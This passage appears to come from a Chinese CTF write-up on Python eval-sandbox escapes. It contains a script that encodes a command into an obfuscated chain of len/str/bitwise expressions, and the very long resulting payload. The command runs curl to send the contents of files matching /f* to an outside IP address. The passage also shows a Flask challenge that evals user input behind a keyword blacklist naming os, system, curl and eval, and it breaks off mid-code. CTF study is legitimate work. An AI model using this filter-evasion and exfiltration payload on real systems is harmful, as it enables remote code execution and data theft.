<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getNumber</span>(<span class="params">num</span>):</span><br><span class="line">    number = <span class="built_in">int</span>(num)</span><br><span class="line">    <span class="keyword">if</span> number <span class="keyword">in</span> [-<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&quot;~int((len(str(None))/len(str(None))))&quot;</span>, <span class="string">&quot;~int(len(str()))&quot;</span>, <span class="string">&quot;int(len(str()))&quot;</span>, <span class="string">&quot;int((len(str(None))/len(str(None))))&quot;</span>][number+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> number % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;~%s&#x27;</span> % getNumber(~number)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;(%s&lt;&lt;(int((len(str(None))/len(str(None))))))&#x27;</span> % getNumber(number/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;import os;os.system(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;)&quot;</span></span><br><span class="line">exp = <span class="string">&#x27;str().join([&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    exp += <span class="string">f&quot;chr(<span class="subst">&#123;getNumber(<span class="built_in">ord</span>(i))&#125;</span>),&quot;</span></span><br><span class="line">exp = exp[:-<span class="number">1</span>]  <span class="comment"># 去掉最后一个&#x27;,&#x27;</span></span><br><span class="line">exp += <span class="string">&#x27;])&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(exp)</span><br></pre></td></tr></table></figure>

<p><strong>payload:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str().join([chr(~(~((~(~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(~((~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((((~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(~((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((((int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((((~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((((~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~((~(((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(~(~((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(~((~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((~(~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(((~((int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~(((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(~((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~((~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((((int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((~(~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(~(~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(~(~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(((((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~((~((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~((~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(((~((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(~(((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~(((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((((int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~((~((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(~(~(~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(((~((int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~((~(~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None)))))))])</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str(exec(xxx))</span><br></pre></td></tr></table></figure></li>
<li><p>web444 </p>
<p>这次题目给了源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Q2B</span>(<span class="params">uchar</span>):</span><br><span class="line">    inside_code = <span class="built_in">ord</span>(uchar)</span><br><span class="line">    <span class="keyword">if</span> inside_code == <span class="number">0x3000</span>:</span><br><span class="line">        inside_code = <span class="number">0x0020</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        inside_code -= <span class="number">0xfee0</span></span><br><span class="line">    <span class="keyword">if</span> inside_code &lt; <span class="number">0x0020</span> <span class="keyword">or</span> inside_code &gt; <span class="number">0x7e</span>: </span><br><span class="line">        <span class="keyword">return</span> uchar</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(inside_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stringQ2B</span>(<span class="params">ustring</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([Q2B(uchar) <span class="keyword">for</span> uchar <span class="keyword">in</span> ustring])</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">app_index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        code = request.form[<span class="string">&#x27;code&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> code:</span><br><span class="line">        	code = stringQ2B(code)</span><br><span class="line">        	<span class="keyword">if</span> <span class="string">&#x27;\\u&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">        		<span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">        	<span class="keyword">if</span> <span class="string">&#x27;\\x&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">        		<span class="keyword">return</span> <span class="string">&#x27;hacker?&#x27;</span></span><br><span class="line">        	reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;os|open|system|read|eval|builtins|curl|_|getattr|&#123;|\&#x27;|&quot;|\+|[0-9]|request|len&#x27;</span>)</span><br><span class="line">        	<span class="keyword">if</span> reg.search(code)==<span class="literal">None</span>:</span><br><span class="line">        		<span class="keyword">return</span> <span class="built_in">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span 